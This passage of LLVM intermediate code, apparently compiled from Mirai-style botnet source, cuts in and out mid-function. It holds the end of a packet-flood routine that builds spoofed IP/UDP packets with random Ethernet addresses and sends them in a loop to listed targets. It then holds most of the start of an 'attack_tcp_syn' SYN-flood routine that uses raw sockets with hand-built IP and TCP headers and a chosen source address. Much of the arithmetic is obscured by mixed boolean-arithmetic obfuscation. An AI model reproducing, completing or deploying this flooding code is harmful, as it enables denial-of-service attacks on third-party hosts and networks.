  %413 = xor i32 65535, -1
  %414 = xor i32 %412, %413
  %415 = and i32 %414, %412
  %416 = and i32 %412, 65535
  %417 = trunc i32 %415 to i16
  %418 = load %struct.iphdr*, %struct.iphdr** %31, align 8
  %419 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %418, i32 0, i32 3
  store i16 %417, i16* %419, align 4
  %420 = load %struct.iphdr*, %struct.iphdr** %31, align 8
  %421 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %420, i32 0, i32 3
  %422 = load i16, i16* %421, align 4
  %423 = zext i16 %422 to i32
  %424 = sub i32 0, 1000
  %425 = add i32 %423, %424
  %426 = sub nsw i32 %423, 1000
  %427 = xor i32 %425, -1
  %428 = and i32 -1, %427
  %429 = xor i32 -1, -1
  %430 = and i32 %425, %429
  %431 = or i32 %428, %430
  %432 = xor i32 %425, -1
  %433 = trunc i32 %431 to i16
  %434 = load %struct.iphdr*, %struct.iphdr** %34, align 8
  %435 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %434, i32 0, i32 3
  store i16 %433, i16* %435, align 4
  br label %436

; <label>:436:                                    ; preds = %411, %407
  %437 = load i16, i16* %16, align 2
  %438 = zext i16 %437 to i32
  %439 = icmp eq i32 %438, 65535
  br i1 %439, label %440, label %453

; <label>:440:                                    ; preds = %436
  %441 = call i32 @rand_next()
  %442 = xor i32 %441, -1
  %443 = xor i32 65535, -1
  %444 = xor i32 -268186255, -1
  %445 = or i32 %442, %443
  %446 = or i32 -268186255, %444
  %447 = xor i32 %445, -1
  %448 = and i32 %447, %446
  %449 = and i32 %441, 65535
  %450 = trunc i32 %448 to i16
  %451 = load %struct.udphdr*, %struct.udphdr** %35, align 8
  %452 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %451, i32 0, i32 0
  store i16 %450, i16* %452, align 2
  br label %453

; <label>:453:                                    ; preds = %440, %436
  %454 = load i16, i16* %17, align 2
  %455 = zext i16 %454 to i32
  %456 = icmp eq i32 %455, 65535
  br i1 %456, label %457, label %470

; <label>:457:                                    ; preds = %453
  %458 = call i32 @rand_next()
  %459 = xor i32 %458, -1
  %460 = xor i32 65535, -1
  %461 = xor i32 1361673895, -1
  %462 = or i32 %459, %460
  %463 = or i32 1361673895, %461
  %464 = xor i32 %462, -1
  %465 = and i32 %464, %463
  %466 = and i32 %458, 65535
  %467 = trunc i32 %465 to i16
  %468 = load %struct.udphdr*, %struct.udphdr** %35, align 8
  %469 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %468, i32 0, i32 1
  store i16 %467, i16* %469, align 2
  br label %470

; <label>:470:                                    ; preds = %457, %453
  %471 = load i8, i8* %20, align 1
  %472 = icmp ne i8 %471, 0
  br i1 %472, label %477, label %473

; <label>:473:                                    ; preds = %470
  %474 = call i32 @rand_next()
  %475 = load %struct.iphdr*, %struct.iphdr** %34, align 8
  %476 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %475, i32 0, i32 9
  store i32 %474, i32* %476, align 4
  br label %483

; <label>:477:                                    ; preds = %470
  %478 = load %struct.iphdr*, %struct.iphdr** %31, align 8
  %479 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %478, i32 0, i32 9
  %480 = load i32, i32* %479, align 4
  %481 = load %struct.iphdr*, %struct.iphdr** %34, align 8
  %482 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %481, i32 0, i32 9
  store i32 %480, i32* %482, align 4
  br label %483

; <label>:483:                                    ; preds = %477, %473
  %484 = call i32 @rand_next()
  store i32 %484, i32* %37, align 4
  %485 = call i32 @rand_next()
  store i32 %485, i32* %38, align 4
  %486 = call i32 @rand_next()
  store i32 %486, i32* %39, align 4
  %487 = load %struct.ethhdr*, %struct.ethhdr** %33, align 8
  %488 = getelementptr inbounds %struct.ethhdr, %struct.ethhdr* %487, i32 0, i32 0
  %489 = getelementptr inbounds [6 x i8], [6 x i8]* %488, i32 0, i32 0
  %490 = bitcast i32* %37 to i8*
  call void @util_memcpy(i8* %489, i8* %490, i32 4)
  %491 = load %struct.ethhdr*, %struct.ethhdr** %33, align 8
  %492 = getelementptr inbounds %struct.ethhdr, %struct.ethhdr* %491, i32 0, i32 1
  %493 = getelementptr inbounds [6 x i8], [6 x i8]* %492, i32 0, i32 0
  %494 = bitcast i32* %38 to i8*
  call void @util_memcpy(i8* %493, i8* %494, i32 4)
  %495 = load %struct.ethhdr*, %struct.ethhdr** %33, align 8
  %496 = getelementptr inbounds %struct.ethhdr, %struct.ethhdr* %495, i32 0, i32 0
  %497 = getelementptr inbounds [6 x i8], [6 x i8]* %496, i32 0, i32 0
  %498 = getelementptr inbounds i8, i8* %497, i64 4
  %499 = bitcast i32* %39 to i8*
  call void @util_memcpy(i8* %498, i8* %499, i32 2)
  %500 = load %struct.ethhdr*, %struct.ethhdr** %33, align 8
  %501 = getelementptr inbounds %struct.ethhdr, %struct.ethhdr* %500, i32 0, i32 1
  %502 = getelementptr inbounds [6 x i8], [6 x i8]* %501, i32 0, i32 0
  %503 = getelementptr inbounds i8, i8* %502, i64 4
  %504 = bitcast i32* %39 to i8*
  %505 = getelementptr inbounds i8, i8* %504, i64 2
  call void @util_memcpy(i8* %503, i8* %505, i32 2)
  %506 = load i8, i8* %19, align 1
  %507 = icmp ne i8 %506, 0
  br i1 %507, label %508, label %511

; <label>:508:                                    ; preds = %483
  %509 = load i8*, i8** %36, align 8
  %510 = load i32, i32* %18, align 4
  call void @rand_str(i8* %509, i32 %510)
  br label %511

; <label>:511:                                    ; preds = %508, %483
  %512 = load %struct.iphdr*, %struct.iphdr** %31, align 8
  %513 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %512, i32 0, i32 7
  store i16 0, i16* %513, align 2
  %514 = load %struct.iphdr*, %struct.iphdr** %31, align 8
  %515 = bitcast %struct.iphdr* %514 to i16*
  %516 = call zeroext i16 @checksum_generic(i16* %515, i32 20)
  %517 = load %struct.iphdr*, %struct.iphdr** %31, align 8
  %518 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %517, i32 0, i32 7
  store i16 %516, i16* %518, align 2
  %519 = load %struct.iphdr*, %struct.iphdr** %34, align 8
  %520 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %519, i32 0, i32 7
  store i16 0, i16* %520, align 2
  %521 = load %struct.iphdr*, %struct.iphdr** %34, align 8
  %522 = bitcast %struct.iphdr* %521 to i16*
  %523 = call zeroext i16 @checksum_generic(i16* %522, i32 20)
  %524 = load %struct.iphdr*, %struct.iphdr** %34, align 8
  %525 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %524, i32 0, i32 7
  store i16 %523, i16* %525, align 2
  %526 = load %struct.udphdr*, %struct.udphdr** %35, align 8
  %527 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %526, i32 0, i32 3
  store i16 0, i16* %527, align 2
  %528 = load %struct.iphdr*, %struct.iphdr** %34, align 8
  %529 = load %struct.udphdr*, %struct.udphdr** %35, align 8
  %530 = bitcast %struct.udphdr* %529 to i8*
  %531 = load %struct.udphdr*, %struct.udphdr** %35, align 8
  %532 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %531, i32 0, i32 2
  %533 = load i16, i16* %532, align 2
  %534 = load i32, i32* %18, align 4
  %535 = sext i32 %534 to i64
  %536 = sub i64 0, 8
  %537 = sub i64 0, %535
  %538 = add i64 %536, %537
  %539 = sub i64 0, %538
  %540 = add i64 8, %535
  %541 = trunc i64 %539 to i32
  %542 = call zeroext i16 @checksum_tcpudp(%struct.iphdr* %528, i8* %530, i16 zeroext %533, i32 %541)
  %543 = load %struct.udphdr*, %struct.udphdr** %35, align 8
  %544 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %543, i32 0, i32 3
  store i16 %542, i16* %544, align 2
  %545 = load %struct.attack_target*, %struct.attack_target** %6, align 8
  %546 = load i32, i32* %9, align 4
  %547 = sext i32 %546 to i64
  %548 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %545, i64 %547
  %549 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %548, i32 0, i32 0
  %550 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %549, i32 0, i32 0
  store i16 2, i16* %550, align 4
  %551 = load %struct.iphdr*, %struct.iphdr** %31, align 8
  %552 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %551, i32 0, i32 9
  %553 = load i32, i32* %552, align 4
  %554 = load %struct.attack_target*, %struct.attack_target** %6, align 8
  %555 = load i32, i32* %9, align 4
  %556 = sext i32 %555 to i64
  %557 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %554, i64 %556
  %558 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %557, i32 0, i32 0
  %559 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %558, i32 0, i32 2
  %560 = getelementptr inbounds %struct.in_addr, %struct.in_addr* %559, i32 0, i32 0
  store i32 %553, i32* %560, align 4
  %561 = load %struct.attack_target*, %struct.attack_target** %6, align 8
  %562 = load i32, i32* %9, align 4
  %563 = sext i32 %562 to i64
  %564 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %561, i64 %563
  %565 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %564, i32 0, i32 0
  %566 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %565, i32 0, i32 1
  store i16 0, i16* %566, align 2
  %567 = load i32, i32* %10, align 4
  %568 = load i8*, i8** %30, align 8
  %569 = load i32, i32* %18, align 4
  %570 = sext i32 %569 to i64
  %571 = add i64 66, 3265639707651679788
  %572 = add i64 %571, %570
  %573 = sub i64 %572, 3265639707651679788
  %574 = add i64 66, %570
  %575 = bitcast %union.__CONST_SOCKADDR_ARG* %40 to %struct.sockaddr**
  %576 = load %struct.attack_target*, %struct.attack_target** %6, align 8
  %577 = load i32, i32* %9, align 4
  %578 = sext i32 %577 to i64
  %579 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %576, i64 %578
  %580 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %579, i32 0, i32 0
  %581 = bitcast %struct.sockaddr_in* %580 to %struct.sockaddr*
  store %struct.sockaddr* %581, %struct.sockaddr** %575, align 8
  %582 = getelementptr inbounds %union.__CONST_SOCKADDR_ARG, %union.__CONST_SOCKADDR_ARG* %40, i32 0, i32 0
  %583 = load %struct.sockaddr*, %struct.sockaddr** %582, align 8
  %584 = call i64 @sendto(i32 %567, i8* %568, i64 %573, i32 16384, %struct.sockaddr* %583, i32 16)
  br label %585

; <label>:585:                                    ; preds = %511
  %586 = load i32, i32* %9, align 4
  %587 = sub i32 %586, 611503556
  %588 = add i32 %587, 1
  %589 = add i32 %588, 611503556
  %590 = add nsw i32 %586, 1
  store i32 %589, i32* %9, align 4
  br label %339

; <label>:591:                                    ; preds = %339
  br label %338

; <label>:592:                                    ; preds = %92, %86
  ret void
}

; Function Attrs: noinline nounwind uwtable
define void @attack_tcp_syn(i8 zeroext, %struct.attack_target*, i8 zeroext, %struct.attack_option*) #0 {
  %5 = alloca i8, align 1
  %6 = alloca %struct.attack_target*, align 8
  %7 = alloca i8, align 1
  %8 = alloca %struct.attack_option*, align 8
  %9 = alloca i32, align 4
  %10 = alloca i32, align 4
  %11 = alloca i8**, align 8
  %12 = alloca i8, align 1
  %13 = alloca i16, align 2
  %14 = alloca i8, align 1
  %15 = alloca i8, align 1
  %16 = alloca i16, align 2
  %17 = alloca i16, align 2
  %18 = alloca i32, align 4
  %19 = alloca i32, align 4
  %20 = alloca i8, align 1
  %21 = alloca i8, align 1
  %22 = alloca i8, align 1
  %23 = alloca i8, align 1
  %24 = alloca i8, align 1
  %25 = alloca i8, align 1
  %26 = alloca i32, align 4
  %27 = alloca %struct.iphdr*, align 8
  %28 = alloca %struct.tcphdr*, align 8
  %29 = alloca i8*, align 8
  %30 = alloca i8*, align 8
  %31 = alloca %struct.iphdr*, align 8
  %32 = alloca %struct.tcphdr*, align 8
  %33 = alloca %union.__CONST_SOCKADDR_ARG, align 8
  store i8 %0, i8* %5, align 1
  store %struct.attack_target* %1, %struct.attack_target** %6, align 8
  store i8 %2, i8* %7, align 1
  store %struct.attack_option* %3, %struct.attack_option** %8, align 8
  %34 = load i8, i8* %5, align 1
  %35 = zext i8 %34 to i64
  %36 = call noalias i8* @calloc(i64 %35, i64 8) #6
  %37 = bitcast i8* %36 to i8**
  store i8** %37, i8*** %11, align 8
  %38 = load i8, i8* %7, align 1
  %39 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %40 = call i32 @attack_get_opt_int(i8 zeroext %38, %struct.attack_option* %39, i8 zeroext 2, i32 0)
  %41 = trunc i32 %40 to i8
  store i8 %41, i8* %12, align 1
  %42 = load i8, i8* %7, align 1
  %43 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %44 = call i32 @attack_get_opt_int(i8 zeroext %42, %struct.attack_option* %43, i8 zeroext 3, i32 65535)
  %45 = trunc i32 %44 to i16
  store i16 %45, i16* %13, align 2
  %46 = load i8, i8* %7, align 1
  %47 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %48 = call i32 @attack_get_opt_int(i8 zeroext %46, %struct.attack_option* %47, i8 zeroext 4, i32 64)
  %49 = trunc i32 %48 to i8
  store i8 %49, i8* %14, align 1
  %50 = load i8, i8* %7, align 1
  %51 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %52 = call i32 @attack_get_opt_int(i8 zeroext %50, %struct.attack_option* %51, i8 zeroext 5, i32 1)
  %53 = trunc i32 %52 to i8
  store i8 %53, i8* %15, align 1
  %54 = load i8, i8* %7, align 1
  %55 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %56 = call i32 @attack_get_opt_int(i8 zeroext %54, %struct.attack_option* %55, i8 zeroext 6, i32 65535)
  %57 = trunc i32 %56 to i16
  store i16 %57, i16* %16, align 2
  %58 = load i8, i8* %7, align 1
  %59 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %60 = call i32 @attack_get_opt_int(i8 zeroext %58, %struct.attack_option* %59, i8 zeroext 7, i32 65535)
  %61 = trunc i32 %60 to i16
  store i16 %61, i16* %17, align 2
  %62 = load i8, i8* %7, align 1
  %63 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %64 = call i32 @attack_get_opt_int(i8 zeroext %62, %struct.attack_option* %63, i8 zeroext 17, i32 65535)
  store i32 %64, i32* %18, align 4
  %65 = load i8, i8* %7, align 1
  %66 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %67 = call i32 @attack_get_opt_int(i8 zeroext %65, %struct.attack_option* %66, i8 zeroext 18, i32 0)
  store i32 %67, i32* %19, align 4
  %68 = load i8, i8* %7, align 1
  %69 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %70 = call i32 @attack_get_opt_int(i8 zeroext %68, %struct.attack_option* %69, i8 zeroext 11, i32 0)
  %71 = trunc i32 %70 to i8
  store i8 %71, i8* %20, align 1
  %72 = load i8, i8* %7, align 1
  %73 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %74 = call i32 @attack_get_opt_int(i8 zeroext %72, %struct.attack_option* %73, i8 zeroext 12, i32 0)
  %75 = trunc i32 %74 to i8
  store i8 %75, i8* %21, align 1
  %76 = load i8, i8* %7, align 1
  %77 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %78 = call i32 @attack_get_opt_int(i8 zeroext %76, %struct.attack_option* %77, i8 zeroext 13, i32 0)
  %79 = trunc i32 %78 to i8
  store i8 %79, i8* %22, align 1
  %80 = load i8, i8* %7, align 1
  %81 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %82 = call i32 @attack_get_opt_int(i8 zeroext %80, %struct.attack_option* %81, i8 zeroext 14, i32 0)
  %83 = trunc i32 %82 to i8
  store i8 %83, i8* %23, align 1
  %84 = load i8, i8* %7, align 1
  %85 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %86 = call i32 @attack_get_opt_int(i8 zeroext %84, %struct.attack_option* %85, i8 zeroext 15, i32 1)
  %87 = trunc i32 %86 to i8
  store i8 %87, i8* %24, align 1
  %88 = load i8, i8* %7, align 1
  %89 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %90 = call i32 @attack_get_opt_int(i8 zeroext %88, %struct.attack_option* %89, i8 zeroext 16, i32 0)
  %91 = trunc i32 %90 to i8
  store i8 %91, i8* %25, align 1
  %92 = load i8, i8* %7, align 1
  %93 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %94 = load i32, i32* @LOCAL_ADDR, align 4
  %95 = call i32 @attack_get_opt_ip(i8 zeroext %92, %struct.attack_option* %93, i8 zeroext 25, i32 %94)
  store i32 %95, i32* %26, align 4
  %96 = call i32 @socket(i32 2, i32 3, i32 6) #6
  store i32 %96, i32* %10, align 4
  %97 = icmp eq i32 %96, -1
  br i1 %97, label %98, label %99

; <label>:98:                                     ; preds = %4
  br label %629

; <label>:99:                                     ; preds = %4
  store i32 1, i32* %9, align 4
  %100 = load i32, i32* %10, align 4
  %101 = bitcast i32* %9 to i8*
  %102 = call i32 @setsockopt(i32 %100, i32 0, i32 3, i8* %101, i32 4) #6
  %103 = icmp eq i32 %102, -1
  br i1 %103, label %104, label %107

; <label>:104:                                    ; preds = %99
  %105 = load i32, i32* %10, align 4
  %106 = call i32 @close(i32 %105)
  br label %629

; <label>:107:                                    ; preds = %99
  store i32 0, i32* %9, align 4
  br label %108

; <label>:108:                                    ; preds = %451, %107
  %109 = load i32, i32* %9, align 4
  %110 = load i8, i8* %5, align 1
  %111 = zext i8 %110 to i32
  %112 = icmp slt i32 %109, %111
  br i1 %112, label %113, label %457

; <label>:113:                                    ; preds = %108
  %114 = call noalias i8* @calloc(i64 128, i64 1) #6
  %115 = load i8**, i8*** %11, align 8
  %116 = load i32, i32* %9, align 4
  %117 = sext i32 %116 to i64
  %118 = getelementptr inbounds i8*, i8** %115, i64 %117
  store i8* %114, i8** %118, align 8
  %119 = load i8**, i8*** %11, align 8
  %120 = load i32, i32* %9, align 4
  %121 = sext i32 %120 to i64
  %122 = getelementptr inbounds i8*, i8** %119, i64 %121
  %123 = load i8*, i8** %122, align 8
  %124 = bitcast i8* %123 to %struct.iphdr*
  store %struct.iphdr* %124, %struct.iphdr** %27, align 8
  %125 = load %struct.iphdr*, %struct.iphdr** %27, align 8
  %126 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %125, i64 1
  %127 = bitcast %struct.iphdr* %126 to %struct.tcphdr*
  store %struct.tcphdr* %127, %struct.tcphdr** %28, align 8
  %128 = load %struct.tcphdr*, %struct.tcphdr** %28, align 8
  %129 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %128, i64 1
  %130 = bitcast %struct.tcphdr* %129 to i8*
  store i8* %130, i8** %29, align 8
  %131 = load %struct.iphdr*, %struct.iphdr** %27, align 8
  %132 = bitcast %struct.iphdr* %131 to i8*
  %133 = load i8, i8* %132, align 4
  %134 = xor i8 15, -1
  %135 = xor i8 %133, %134
  %136 = and i8 %135, %133
  %137 = and i8 %133, 15
  %138 = and i8 %136, 64
  %139 = xor i8 %136, 64
  %140 = or i8 %138, %139
  %141 = or i8 %136, 64
  store i8 %140, i8* %132, align 4
  %142 = load %struct.iphdr*, %struct.iphdr** %27, align 8
  %143 = bitcast %struct.iphdr* %142 to i8*
  %144 = load i8, i8* %143, align 4
  %145 = xor i8 %144, -1
  %146 = xor i8 -16, -1
  %147 = xor i8 95, -1
  %148 = or i8 %145, %146
  %149 = or i8 95, %147
  %150 = xor i8 %148, -1
  %151 = and i8 %150, %149
  %152 = and i8 %144, -16
  %153 = xor i8 %151, -1
  %154 = xor i8 5, -1
  %155 = xor i8 -113, -1
  %156 = and i8 %153, -113
  %157 = and i8 %151, %155
  %158 = and i8 %154, -113
  %159 = and i8 5, %155
  %160 = or i8 %156, %157
  %161 = or i8 %158, %159
  %162 = xor i8 %160, %161
  %163 = or i8 %153, %154
  %164 = xor i8 %163, -1
  %165 = or i8 -113, %155
  %166 = and i8 %164, %165
  %167 = or i8 %162, %166
  %168 = or i8 %151, 5
  store i8 %167, i8* %143, align 4
  %169 = load i8, i8* %12, align 1
  %170 = load %struct.iphdr*, %struct.iphdr** %27, align 8
  %171 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %170, i32 0, i32 1
  store i8 %169, i8* %171, align 1
  %172 = call zeroext i16 @htons(i16 zeroext 60) #7
  %173 = load %struct.iphdr*, %struct.iphdr** %27, align 8
  %174 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %173, i32 0, i32 2
  store i16 %172, i16* %174, align 2
  %175 = load i16, i16* %13, align 2
  %176 = call zeroext i16 @htons(i16 zeroext %175) #7
  %177 = load %struct.iphdr*, %struct.iphdr** %27, align 8
  %178 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %177, i32 0, i32 3
  store i16 %176, i16* %178, align 4
  %179 = load i8, i8* %14, align 1
  %180 = load %struct.iphdr*, %struct.iphdr** %27, align 8
  %181 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %180, i32 0, i32 5
  store i8 %179, i8* %181, align 4
  %182 = load i8, i8* %15, align 1
  %183 = icmp ne i8 %182, 0
  br i1 %183, label %184, label %188

; <label>:184:                                    ; preds = %113
  %185 = call zeroext i16 @htons(i16 zeroext 16384) #7
  %186 = load %struct.iphdr*, %struct.iphdr** %27, align 8
  %187 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %186, i32 0, i32 4
  store i16 %185, i16* %187, align 2
  br label %188

; <label>:188:                                    ; preds = %184, %113
  %189 = load %struct.iphdr*, %struct.iphdr** %27, align 8
  %190 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %189, i32 0, i32 6
  store i8 6, i8* %190, align 1
  %191 = load i32, i32* %26, align 4
  %192 = load %struct.iphdr*, %struct.iphdr** %27, align 8
  %193 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %192, i32 0, i32 8
  store i32 %191, i32* %193, align 4
  %194 = load %struct.attack_target*, %struct.attack_target** %6, align 8
  %195 = load i32, i32* %9, align 4
  %196 = sext i32 %195 to i64
  %197 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %194, i64 %196
  %198 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %197, i32 0, i32 1
  %199 = load i32, i32* %198, align 4
  %200 = load %struct.iphdr*, %struct.iphdr** %27, align 8
  %201 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %200, i32 0, i32 9
  store i32 %199, i32* %201, align 4
  %202 = load i16, i16* %16, align 2
  %203 = call zeroext i16 @htons(i16 zeroext %202) #7
  %204 = load %struct.tcphdr*, %struct.tcphdr** %28, align 8
  %205 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %204, i32 0, i32 0
  store i16 %203, i16* %205, align 4
  %206 = load i16, i16* %17, align 2
  %207 = call zeroext i16 @htons(i16 zeroext %206) #7
  %208 = load %struct.tcphdr*, %struct.tcphdr** %28, align 8
  %209 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %208, i32 0, i32 1
  store i16 %207, i16* %209, align 2
  %210 = load i32, i32* %18, align 4
  %211 = trunc i32 %210 to i16
  %212 = call zeroext i16 @htons(i16 zeroext %211) #7
  %213 = zext i16 %212 to i32
  %214 = load %struct.tcphdr*, %struct.tcphdr** %28, align 8
  %215 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %214, i32 0, i32 2
  store i32 %213, i32* %215, align 4
  %216 = load %struct.tcphdr*, %struct.tcphdr** %28, align 8
  %217 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %216, i32 0, i32 4
  %218 = load i16, i16* %217, align 4
  %219 = xor i16 -241, -1
  %220 = xor i16 %218, %219
  %221 = and i16 %220, %218
  %222 = and i16 %218, -241
  %223 = xor i16 %221, -1
  %224 = xor i16 160, -1
  %225 = xor i16 -19591, -1
  %226 = and i16 %223, -19591
  %227 = and i16 %221, %225
  %228 = and i16 %224, -19591
  %229 = and i16 160, %225
  %230 = or i16 %226, %227
  %231 = or i16 %228, %229
  %232 = xor i16 %230, %231
  %233 = or i16 %223, %224
  %234 = xor i16 %233, -1
  %235 = or i16 -19591, %225
  %236 = and i16 %234, %235
  %237 = or i16 %232, %236
  %238 = or i16 %221, 160
  store i16 %237, i16* %217, align 4
  %239 = load i8, i8* %20, align 1
  %240 = sext i8 %239 to i16
  %241 = load %struct.tcphdr*, %struct.tcphdr** %28, align 8
  %242 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %241, i32 0, i32 4
  %243 = load i16, i16* %242, align 4
  %244 = xor i16 1, -1
  %245 = xor i16 %240, %244
  %246 = and i16 %245, %240
  %247 = and i16 %240, 1
  %248 = shl i16 %246, 13
  %249 = xor i16 %243, -1
  %250 = xor i16 -8193, -1
  %251 = xor i16 13686, -1
  %252 = or i16 %249, %250
  %253 = or i16 13686, %251
  %254 = xor i16 %252, -1
  %255 = and i16 %254, %253
  %256 = and i16 %243, -8193
  %257 = and i16 %255, %248
  %258 = xor i16 %255, %248
  %259 = or i16 %257, %258
  %260 = or i16 %255, %248
  store i16 %259, i16* %242, align 4
  %261 = load i8, i8* %21, align 1
  %262 = sext i8 %261 to i16
  %263 = load %struct.tcphdr*, %struct.tcphdr** %28, align 8
  %264 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %263, i32 0, i32 4
  %265 = load i16, i16* %264, align 4
  %266 = xor i16 %262, -1
  %267 = xor i16 1, -1
  %268 = xor i16 -28949, -1
  %269 = or i16 %266, %267
  %270 = or i16 -28949, %268
  %271 = xor i16 %269, -1
  %272 = and i16 %271, %270
  %273 = and i16 %262, 1
  %274 = shl i16 %272, 12
  %275 = xor i16 -4097, -1
  %276 = xor i16 %265, %275
  %277 = and i16 %276, %265
  %278 = and i16 %265, -4097
  %279 = xor i16 %277, -1
  %280 = xor i16 %274, -1
  %281 = xor i16 -20470, -1
  %282 = and i16 %279, -20470
  %283 = and i16 %277, %281
  %284 = and i16 %280, -20470
  %285 = and i16 %274, %281
  %286 = or i16 %282, %283
  %287 = or i16 %284, %285
  %288 = xor i16 %286, %287
  %289 = or i16 %279, %280
  %290 = xor i16 %289, -1
  %291 = or i16 -20470, %281
  %292 = and i16 %290, %291
  %293 = or i16 %288, %292
  %294 = or i16 %277, %274
  store i16 %293, i16* %264, align 4
  %295 = load i8, i8* %22, align 1
  %296 = sext i8 %295 to i16
  %297 = load %struct.tcphdr*, %struct.tcphdr** %28, align 8
  %298 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %297, i32 0, i32 4
  %299 = load i16, i16* %298, align 4
  %300 = xor i16 1, -1
  %301 = xor i16 %296, %300
  %302 = and i16 %301, %296
  %303 = and i16 %296, 1
  %304 = shl i16 %302, 11
  %305 = xor i16 -2049, -1
  %306 = xor i16 %299, %305
  %307 = and i16 %306, %299
  %308 = and i16 %299, -2049
  %309 = xor i16 %307, -1
  %310 = xor i16 %304, -1
  %311 = xor i16 -8845, -1
  %312 = and i16 %309, -8845
  %313 = and i16 %307, %311
  %314 = and i16 %310, -8845
  %315 = and i16 %304, %311
  %316 = or i16 %312, %313
  %317 = or i16 %314, %315
  %318 = xor i16 %316, %317
  %319 = or i16 %309, %310
  %320 = xor i16 %319, -1
  %321 = or i16 -8845, %311
  %322 = and i16 %320, %321
  %323 = or i16 %318, %322
  %324 = or i16 %307, %304
  store i16 %323, i16* %298, align 4
  %325 = load i8, i8* %23, align 1
  %326 = sext i8 %325 to i16
  %327 = load %struct.tcphdr*, %struct.tcphdr** %28, align 8
  %328 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %327, i32 0, i32 4
  %329 = load i16, i16* %328, align 4
  %330 = xor i16 1, -1
  %331 = xor i16 %326, %330
  %332 = and i16 %331, %326
  %333 = and i16 %326, 1
  %334 = shl i16 %332, 10
  %335 = xor i16 -1025, -1
  %336 = xor i16 %329, %335
  %337 = and i16 %336, %329
  %338 = and i16 %329, -1025
  %339 = xor i16 %337, -1
  %340 = xor i16 %334, -1
  %341 = xor i16 -20153, -1
  %342 = and i16 %339, -20153
  %343 = and i16 %337, %341
  %344 = and i16 %340, -20153
  %345 = and i16 %334, %341
  %346 = or i16 %342, %343
  %347 = or i16 %344, %345
  %348 = xor i16 %346, %347
  %349 = or i16 %339, %340
  %350 = xor i16 %349, -1
  %351 = or i16 -20153, %341
  %352 = and i16 %350, %351
  %353 = or i16 %348, %352
  %354 = or i16 %337, %334
  store i16 %353, i16* %328, align 4
  %355 = load i8, i8* %24, align 1
  %356 = sext i8 %355 to i16
  %357 = load %struct.tcphdr*, %struct.tcphdr** %28, align 8
  %358 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %357, i32 0, i32 4
  %359 = load i16, i16* %358, align 4
  %360 = xor i16 1, -1
  %361 = xor i16 %356, %360
  %362 = and i16 %361, %356
  %363 = and i16 %356, 1
  %364 = shl i16 %362, 9
  %365 = xor i16 %359, -1
  %366 = xor i16 -513, -1
  %367 = xor i16 -23477, -1
  %368 = or i16 %365, %366
  %369 = or i16 -23477, %367
  %370 = xor i16 %368, -1
  %371 = and i16 %370, %369
  %372 = and i16 %359, -513
  %373 = and i16 %371, %364
  %374 = xor i16 %371, %364
  %375 = or i16 %373, %374
  %376 = or i16 %371, %364
  store i16 %375, i16* %358, align 4
  %377 = load i8, i8* %25, align 1
  %378 = sext i8 %377 to i16
  %379 = load %struct.tcphdr*, %struct.tcphdr** %28, align 8
  %380 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %379, i32 0, i32 4
  %381 = load i16, i16* %380, align 4
  %382 = xor i16 1, -1
  %383 = xor i16 %378, %382
  %384 = and i16 %383, %378
  %385 = and i16 %378, 1
  %386 = shl i16 %384, 8
  %387 = xor i16 -257, -1
